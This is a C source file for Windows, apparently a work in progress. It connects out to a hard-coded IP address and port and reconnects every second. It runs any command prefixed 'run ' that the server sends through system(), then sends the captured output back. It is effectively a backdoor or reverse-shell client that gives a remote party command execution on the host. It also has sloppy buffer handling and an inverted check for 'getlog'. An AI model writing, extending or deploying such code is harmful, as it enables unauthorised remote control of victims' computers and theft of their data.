#include <winsock2.h>
#include <ws2tcpip.h> // Include this header file
#include <stdio.h>
#include <string.h>

// #pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define HOST "26.199.90.194"
#define PORT 12345

int main() {
    WSADATA wsaData;
    WORD ver = MAKEWORD(2, 2);

    int wsResult = WSAStartup(ver, &wsaData); // тут ошибо
    if (wsResult != 0) {
        printf("WSAStartup failed: %d\n", wsResult);
        return 1;
    }

    SOCKET clientSocket = INVALID_SOCKET;
    while (1) {
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            printf("Socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        int inetPtonResult = inet_pton(AF_INET, HOST, &serverAddress.sin_addr);
        if (inetPtonResult != 1) {
            printf("InetPton failed: %d\n", WSAGetLastError());
            closesocket(clientSocket);
            WSACleanup();
            return 1;
        }

        int connectResult = connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
        if (connectResult == SOCKET_ERROR) {
            printf("Connect failed: %ld\n", WSAGetLastError());
            closesocket(clientSocket);
            Sleep(1000); // ждать 1 секунду перед повторной попыткой
            continue;
        }

        printf("Connected to server.\n");

        char buffer[BUFFER_SIZE];
        while (1) {
            char message[BUFFER_SIZE];
            int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                printf("%s\n", buffer);

                if (strncmp(buffer, "run ", 4) == 0) {
                    char command[256];
                    strcpy(command, buffer + 4);
                    printf("Running command: %s\n", command);
                    char fcommand[256];
                    sprintf(fcommand,"%s > log.txt", command);
                    system(fcommand);
                    strcpy(message, fcommand);
                }

                else if (strncmp(buffer, "getlog", 7)) {
                    char * filename = "log.txt";
                    char fbuffer[BUFFER_SIZE];
                    

                    FILE *fp = fopen(filename, "r");
                    if(fp) {
                        
                        while((fgets(fbuffer, BUFFER_SIZE, fp))!=NULL) {
                            send(clientSocket, fbuffer, strlen(fbuffer), 0);
                        }
                        fclose(fp);
                        strcpy(message, "Send file log.txt...");

                    }
                }
                else {
                    strcpy(message, "Command not found");
                }

                send(clientSocket, message, strlen(message), 0);

            }
            else {
                printf("Connection closed.\n");
                break;
            }
        }

        closesocket(clientSocket);
    }

    WSACleanup();
    return 0;
}

